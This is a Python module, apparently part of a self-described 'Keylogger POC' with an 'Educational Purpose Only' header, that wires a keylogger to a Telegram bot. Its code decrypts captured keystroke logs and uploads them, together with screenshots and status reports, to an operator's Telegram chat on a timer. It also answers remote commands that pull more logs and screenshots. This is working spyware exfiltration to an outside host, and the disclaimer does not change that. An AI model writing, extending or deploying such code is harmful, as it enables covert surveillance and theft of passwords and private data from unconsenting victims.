"""
Telegram Bot Integration Module
Educational Purpose Only - Use Responsibly

This module handles integration with Telegram bot for remote monitoring.
"""

import os
import time
import logging
import threading
import requests
from datetime import datetime, timedelta
from pathlib import Path

class TelegramBot:
    """Handles Telegram bot integration for remote monitoring."""
    
    def __init__(self, config, log_manager):
        self.config = config
        self.log_manager = log_manager
        self.logger = logging.getLogger(__name__)
        self.running = False
        self.monitoring_thread = None
        
        # Telegram configuration
        self.bot_token = config.get('TELEGRAM', 'bot_token', '')
        self.chat_id = config.get('TELEGRAM', 'chat_id', '')
        self.send_interval = config.getint('TELEGRAM', 'send_interval', 3600)  # 1 hour default
        self.max_file_size = config.getint('TELEGRAM', 'max_file_size', 50 * 1024 * 1024)  # 50MB
        
        # Validate configuration
        if not self.bot_token or not self.chat_id:
            self.logger.warning("Telegram bot token or chat ID not configured")
        
        # API URLs
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.send_message_url = f"{self.base_url}/sendMessage"
        self.send_document_url = f"{self.base_url}/sendDocument"
        self.send_photo_url = f"{self.base_url}/sendPhoto"
        
        # Last send time
        self.last_send_time = datetime.now()
    
    def start_monitoring(self):
        """Start Telegram monitoring."""
        if not self.bot_token or not self.chat_id:
            self.logger.error("Telegram bot not properly configured")
            return
        
        if self.running:
            self.logger.warning("Telegram monitoring is already running")
            return
        
        try:
            self.running = True
            self.logger.info(f"Starting Telegram monitoring (interval: {self.send_interval}s)")
            
            # Send startup message
            self.send_message("🔴 Keylogger POC started")
            
            while self.running:
                try:
                    self._send_periodic_update()
                    time.sleep(self.send_interval)
                except Exception as e:
                    self.logger.error(f"Error in Telegram monitoring loop: {e}")
                    time.sleep(60)  # Wait before retrying
            
        except Exception as e:
            self.logger.error(f"Error starting Telegram monitoring: {e}")
        finally:
            self.running = False
    
    def stop_monitoring(self):
        """Stop Telegram monitoring."""
        if not self.running:
            return
        
        self.running = False
        
        # Send shutdown message
        try:
            self.send_message("🟡 Keylogger POC stopped")
        except:
            pass  # Ignore errors during shutdown
        
        self.logger.info("Telegram monitoring stopped")
    
    def send_message(self, text):
        """Send a text message to Telegram."""
        try:
            data = {
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(self.send_message_url, data=data, timeout=30)
            response.raise_for_status()
            
            self.logger.debug(f"Message sent to Telegram: {text[:50]}...")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending Telegram message: {e}")
            return False
    
    def send_file(self, file_path, caption=""):
        """Send a file to Telegram."""
        try:
            file_path = Path(file_path)
            
            if not file_path.exists():
                self.logger.error(f"File not found: {file_path}")
                return False
            
            file_size = file_path.stat().st_size
            if file_size > self.max_file_size:
                self.logger.warning(f"File too large for Telegram: {file_size} bytes")
                return False
            
            # Determine if it's an image or document
            if file_path.suffix.lower() in ['.png', '.jpg', '.jpeg']:
                url = self.send_photo_url
                files = {'photo': open(file_path, 'rb')}
            else:
                url = self.send_document_url
                files = {'document': open(file_path, 'rb')}
            
            data = {
                'chat_id': self.chat_id,
                'caption': caption
            }
            
            response = requests.post(url, data=data, files=files, timeout=60)
            response.raise_for_status()
            
            # Close file
            for file_obj in files.values():
                file_obj.close()
            
            self.logger.debug(f"File sent to Telegram: {file_path.name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending file to Telegram: {e}")
            return False
    
    def send_log_summary(self):
        """Send a summary of recent logs."""
        try:
            # Get log statistics
            stats = self.log_manager.get_log_statistics()
            
            # Create summary message
            message = f"""📊 <b>Keylogger Status Report</b>
            
🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📁 <b>Log Files:</b>
• Keystroke files: {stats.get('keystroke_files', 0)}
• Screenshot files: {stats.get('screenshot_files', 0)}
• System files: {stats.get('system_files', 0)}

💾 <b>Total Size:</b> {self._format_file_size(stats.get('total_size', 0))}

⏱️ <b>Next Update:</b> {(datetime.now() + timedelta(seconds=self.send_interval)).strftime('%H:%M:%S')}
"""
            
            return self.send_message(message)
            
        except Exception as e:
            self.logger.error(f"Error sending log summary: {e}")
            return False
    
    def send_recent_logs(self, count=1):
        """Send recent log files."""
        try:
            # Get recent keystroke logs
            log_files = self.log_manager.get_log_files('keystrokes')
            
            sent_count = 0
            for log_file in log_files[:count]:
                if log_file.suffix == '.enc':
                    # Decrypt encrypted log
                    decrypted_content = self.log_manager.decrypt_log_file(log_file)
                    if decrypted_content:
                        # Create temporary file
                        temp_file = log_file.with_suffix('.log')
                        with open(temp_file, 'w', encoding='utf-8') as f:
                            f.write(decrypted_content)
                        
                        # Send file
                        caption = f"📝 Keystroke Log: {log_file.stem}"
                        if self.send_file(temp_file, caption):
                            sent_count += 1
                        
                        # Remove temporary file
                        temp_file.unlink()
                else:
                    # Send unencrypted log
                    caption = f"📝 Keystroke Log: {log_file.stem}"
                    if self.send_file(log_file, caption):
                        sent_count += 1
            
            return sent_count > 0
            
        except Exception as e:
            self.logger.error(f"Error sending recent logs: {e}")
            return False
    
    def send_recent_screenshots(self, count=1):
        """Send recent screenshots."""
        try:
            # Get recent screenshots
            screenshot_files = self.log_manager.get_log_files('screenshots')
            
            sent_count = 0
            for screenshot_file in screenshot_files[:count]:
                caption = f"📸 Screenshot: {screenshot_file.stem}"
                if self.send_file(screenshot_file, caption):
                    sent_count += 1
            
            return sent_count > 0
            
        except Exception as e:
            self.logger.error(f"Error sending recent screenshots: {e}")
            return False
    
    def _send_periodic_update(self):
        """Send periodic update with logs and screenshots."""
        try:
            # Send status summary
            self.send_log_summary()
            
            # Send recent logs if enabled
            if self.config.getboolean('TELEGRAM', 'send_logs', fallback=True):
                self.send_recent_logs(1)
            
            # Send recent screenshots if enabled
            if self.config.getboolean('TELEGRAM', 'send_screenshots', fallback=True):
                self.send_recent_screenshots(1)
            
            self.last_send_time = datetime.now()
            
        except Exception as e:
            self.logger.error(f"Error sending periodic update: {e}")
    
    def send_alert(self, message):
        """Send an alert message."""
        try:
            alert_message = f"🚨 <b>ALERT</b>\n\n{message}\n\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            return self.send_message(alert_message)
            
        except Exception as e:
            self.logger.error(f"Error sending alert: {e}")
            return False
    
    def test_connection(self):
        """Test Telegram bot connection."""
        try:
            # Get bot info
            url = f"{self.base_url}/getMe"
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            
            bot_info = response.json()
            if bot_info.get('ok'):
                bot_name = bot_info['result']['first_name']
                self.logger.info(f"Telegram bot connection successful: {bot_name}")
                return True
            else:
                self.logger.error("Telegram bot connection failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Error testing Telegram connection: {e}")
            return False
    
    def _format_file_size(self, size_bytes):
        """Format file size in human-readable format."""
        try:
            if size_bytes < 1024:
                return f"{size_bytes} B"
            elif size_bytes < 1024 * 1024:
                return f"{size_bytes / 1024:.1f} KB"
            elif size_bytes < 1024 * 1024 * 1024:
                return f"{size_bytes / (1024 * 1024):.1f} MB"
            else:
                return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"
                
        except:
            return "Unknown"
    
    def handle_command(self, command):
        """Handle commands sent via Telegram."""
        try:
            command = command.lower().strip()
            
            if command == '/status':
                return self.send_log_summary()
            elif command == '/logs':
                return self.send_recent_logs(3)
            elif command == '/screenshots':
                return self.send_recent_screenshots(3)
            elif command == '/help':
                help_text = """🤖 <b>Available Commands:</b>
                
/status - Get current status
/logs - Get recent log files
/screenshots - Get recent screenshots
/help - Show this help message
"""
                return self.send_message(help_text)
            else:
                return self.send_message("❓ Unknown command. Use /help for available commands.")
                
        except Exception as e:
            self.logger.error(f"Error handling command: {e}")
            return False

